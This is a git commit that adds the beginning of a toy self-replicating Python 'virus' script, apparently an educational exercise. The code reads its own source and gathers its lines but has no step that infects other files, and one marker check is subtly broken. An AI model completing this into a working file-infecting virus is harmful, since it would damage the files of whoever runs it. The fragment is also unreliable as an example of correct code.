73b35980b979da077dec99e748d8b937aabdbac4
PRO-Coding <80043809+pro-whitehatjr@users.noreply.github.com>
2021-09-30 15:09:25 +0530

    Add files via upload

---
+++ Replicate virus.py
@@ -0,0 +1,24 @@
+# I AM VIRUS !
+
+import sys
+import glob
+
+virus_code = []
+
+with open(sys.argv[0], 'r') as f:
+    lines = f.readlines()
+
+self_replicating_part = False
+for line in lines:
+    if line == "# VIRUS SAYS HI, HAVE INFECTED ALL YOUR FILES!!":
+        self_replicating_part = True
+    if not self_replicating_part:
+        virus_code.append(line)
+    if line == "# VIRUS SAYS BYE!\n":
+        break
+
+
+
+
+
+# VIRUS SAYS BYE!
